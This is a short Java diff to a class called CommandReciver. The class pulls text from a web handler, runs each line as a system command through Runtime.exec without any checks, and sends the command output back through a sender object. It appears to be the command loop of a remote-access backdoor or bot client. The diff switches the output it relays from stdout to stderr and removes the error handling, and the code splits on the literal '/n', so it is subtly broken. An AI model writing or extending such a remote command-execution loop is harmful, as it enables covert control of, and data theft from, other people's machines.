@@ -29,28 +29,19 @@ public class CommandReciver {
     public void readCommands(){
         String[] commands = webHandler.getContent().split("/n");
         for (String command : commands) {
-            try {
-                excecute(command);
-            } catch (IOException e) {
-                e.printStackTrace();
-            }
+            excecute(command);
         }
     }
 
 
-    public void excecute(String command) throws IOException {
+    public void excecute(String command) {
         Process pr = null;
         try {
             pr = Runtime.getRuntime().exec(command);
 
-            BufferedReader in = new BufferedReader(new InputStreamReader(pr.getInputStream()));
             BufferedReader err = new BufferedReader(new InputStreamReader(pr.getErrorStream()));
             String line;
-            while ((line = in.readLine()) != null) {
-                System.out.println("command" + line);
-                sender.send("result", line);
-            }
-            while ((line = in.readLine()) != null) {
+            while ((line = err.readLine()) != null) {
                 System.out.println("command" + line);
                 sender.send("result", line);
             }
